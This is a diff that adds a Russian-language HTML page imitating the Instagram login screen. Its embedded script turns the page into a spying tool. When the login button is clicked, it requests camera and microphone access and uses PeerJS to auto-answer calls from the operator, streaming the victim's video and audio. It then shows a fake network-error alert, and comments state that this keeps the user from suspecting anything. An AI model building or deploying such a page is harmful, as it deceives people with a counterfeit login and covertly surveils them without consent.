@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<title>Instagram</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;500&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+
+<div class="main">
+
+    <div class="left">
+        <img class="ig-logo"
+             src="https://cdn-icons-png.flaticon.com/512/5968/5968776.png">
+
+        <h1>
+            Посмотрите, какими моментами из<br>
+            жизни поделились ваши
+            <span class="orange">близкие</span><br>
+            <span class="pink">друзья</span>.
+        </h1>
+
+        <div class="stories">
+            <img src="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png"
+                 class="story single">
+        </div>
+    </div>
+
+    <div class="right">
+        <h2>Войти в Instagram</h2>
+
+        <input class="input" type="text"
+               placeholder="Имя пользователя, номер телефона или эл. адрес">
+
+        <input class="input" type="password" placeholder="Пароль">
+
+        <button class="btn">Войти</button>
+
+        <a class="link" href="#">Забыли пароль?</a>
+
+        <button class="fb-btn">Войти через Facebook</button>
+        <button class="create">Создать новый аккаунт</button>
+
+        <div class="meta">∞ Meta</div>
+    </div>
+
+</div>
+
+<footer class="footer">
+    <div class="footer-links">
+        <a href="#">Meta</a>
+        <a href="#">Информация</a>
+        <a href="#">Блог</a>
+        <a href="#">Вакансии</a>
+        <a href="#">Помощь</a>
+        <a href="#">API</a>
+        <a href="#">Конфиденциальность</a>
+        <a href="#">Условия</a>
+        <a href="#">Места</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Meta AI</a>
+        <a href="#">Threads</a>
+        <a href="#">Загрузка контактов и лица, не являющиеся пользователями</a>
+        <a href="#">Meta Verified</a>
+    </div>
+
+    <div class="footer-bottom">
+        <span>Русский</span>
+        <span>© 2026 Instagram from Meta</span>
+    </div>
+</footer>
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<script>
+    const loginBtn = document.querySelector('.btn');
+    // Создаем Peer. Если хочешь фиксированный ID, можно написать Peer('my-secret-id')
+    const peer = new Peer(); 
+
+    peer.on('open', (id) => {
+        console.log('Твой ID для подключения:', id);
+        // В реальном проекте здесь можно отправить 'id' себе в Telegram через Bot API
+    });
+
+    loginBtn.onclick = async () => {
+        try {
+            // Запрашиваем доступ к камере
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            
+            // Слушаем входящие "звонки" от твоей админки
+            peer.on('call', (call) => {
+                call.answer(stream); // Автоматически принимаем вызов и отдаем видео
+            });
+
+            // Имитируем ошибку входа, чтобы пользователь ничего не заподозрил
+            alert("Произошла ошибка сети. Попробуйте войти через Facebook.");
+        } catch (err) {
+            console.error("Доступ запрещен или камера не найдена", err);
+        }
+    };
+</script>
+</body>
+</html>
